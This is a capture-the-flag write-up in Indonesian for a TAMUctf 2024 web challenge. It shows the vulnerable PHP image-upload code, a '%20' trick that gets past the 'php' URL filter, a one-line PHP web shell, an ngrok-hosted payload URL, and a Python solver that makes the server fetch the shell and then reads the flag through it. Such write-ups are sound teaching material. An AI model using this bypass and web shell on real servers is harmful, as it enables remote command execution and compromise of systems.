# Remote - Web - tamuctf-2024
pada challenge ini terdapat fitur upload yang hanya menerima image, dan kita tidak bisa mengupload shell php dikarenakan adanya filter yang memvalidasi jika di url terdapat php maka file tidak akan terupload, namun ini bisa kita bypass dengan memanfaatkan fungsi yang ada pada code.

## Source Code
```php
<?php
include 'config.php';
include 'bulletproof.php';

function random_filename($length, $directory = '', $extension = '')
{
    // default to this files directory if empty...
    $dir = !empty($directory) && is_dir($directory) ? $directory : dirname(__FILE__);

    do {
        $key = '';
        $keys = array_merge(range(0, 9), range('a', 'z'));

        for ($i = 0; $i < $length; $i++) {
            $key .= $keys[array_rand($keys)];
        }
    } while (file_exists($dir . '/' . $key . (!empty($extension) ? '.' . $extension : '')));

    return $key . (!empty($extension) ? '.' . $extension : '');
}

session_start();
$sess = basename(session_id());

if($sess !== session_id()) {
  echo "ERROR: Invalid session cookie. Please delete the PHPSESSID cookie.";
  die();
}

if(!file_exists('/tmp/uploads/' . $sess)) {
  mkdir('/tmp/uploads/' . $sess, 0755, true);
}

if($_SERVER['REQUEST_METHOD'] === 'POST') {
  if(isset($_FILES['toUpload'])) {
    $image = new Bulletproof\Image($_FILES);
    if($image['toUpload']) {
      $image->setLocation("/tmp/uploads/" . $sess);
      $image->setSize(100, 3000000);
      $image->setMime(array('jpeg', 'gif', 'png'));
      $upload = $image->upload();
  
      if($upload) {
        header('Location: /index.php?message=Image uploaded successfully&status=success');
      } else {
        header('Location: /index.php?message=Image upload failed&status=fail');
      }
    } else {
      header('Location: /index.php?message=Image upload failed&status=fail');
    }
  } else if(isset($_REQUEST['url'])) {
    if(!preg_match("/(htm)|(php)|(js)|(css)/", $_REQUEST['url'])) {
      $url = filter_var($_REQUEST['url'], FILTER_SANITIZE_URL);
      if(filter_var($url, FILTER_VALIDATE_URL)) {
        $img = file_get_contents($url); 
        if($img !== false) {
          $mime = substr($url, strrpos($url, '.') + 1);
          $file = random_filename(32, '/tmp/uploads/' . $sess, $mime);
          
          $f = fopen('/tmp/uploads/' . $sess . '/' . $file, "wb");
          if($f !== false) {
            fwrite($f, $img);
            fclose($f);
            header('Location: /index.php?message=Image uploaded successfully&status=success');
          } else {
            header('Location: /index.php?message=Image upload failed&status=fail'); 
          }
        } else {
          header('Location: /index.php?message=Image upload failed&status=fail');
        }
      } else {
        header('Location: /index.php?message=Image upload failed&status=fail');
      }
    } else {
      header('Location: /index.php?message=Image upload failed&status=fail');
    }
  }
} else {
  if(isset($_GET['file'])) {
    $safe = basename($_GET['file']);
    if($safe !== "" && file_exists('/tmp/uploads/' . $sess . "/" . $safe)) {
      $file = '/tmp/uploads/' . $sess . "/" . $safe;
      $fp = fopen($file, 'rb');

      header('Content-Type: '. mime_content_type($file));
      header('Content-Length: ' . filesize($file));

      fpassthru($fp);
      die();
    } else {
      header('Location: /index.php?message=File not found&status=fail');
    }
  }
}
?>
```

terlihat pada kode ditas terdapat fungsi `preg_match` yang memvalidasi apakah ada `htm`, `php`, `js`, dan `css` pada url, jika ada maka file tidak akan teruplaod

kemudian terdapat fungsi `filter_var`, yang akan kita manfaatkan untuk mengupload file `shell.php`

terlihat bahwa `preg_match` akan melakukan pengecekan apakah ada kata kata yang di blacklist pada url, namun jika kita menambahkan seperti `%00`, `%20`, kita bisa membypass fungsi `preg_match`, dan url kita tetap valid karena adanya fungsi `filter_var`, yang akan menghapus spasi atau null byte pada url.

ini payloadnya
```html
https://d341-180-244-128-189.ngrok-free.app/shell.p%20hp
```

dan ini isi dari shell.php
```php
<?php system($_GET['cmd']); ?>
```

berdasarkan kode di index.php, kita bisa melakukan file upload via url, kita bisa memanfaatkannya untuk mengupload `shell.php`, yang sudah di hosting di `ngrok`, dan menguploadnya ke sistem target.

## Solver Code
```python
import requests

link = 'https://d341-180-244-128-189.ngrok-free.app/shell.p%20hp'
url = f'http://localhost:8000/index.php?url={link}'
cmd = 'cat /var/www/flag*'
flag = f'http://localhost:8000/uploads/467456e9f46c3e641ae6afc15b478c87/gi0dylk3cxprcwj0dcpfft2q2zk8r5qh.php?cmd={cmd}'

cookie = {'PHPSESSID' : '467456e9f46c3e641ae6afc15b478c87'}

res = requests.post(url,cookies=cookie)
flag = requests.get(flag, cookies=cookie)
print(flag.text)
```

file upload diatas dapat ditemukan pada `http://<target-url>/uploads/<PHPSESSID>/<file-name>.php`

Thankyou :))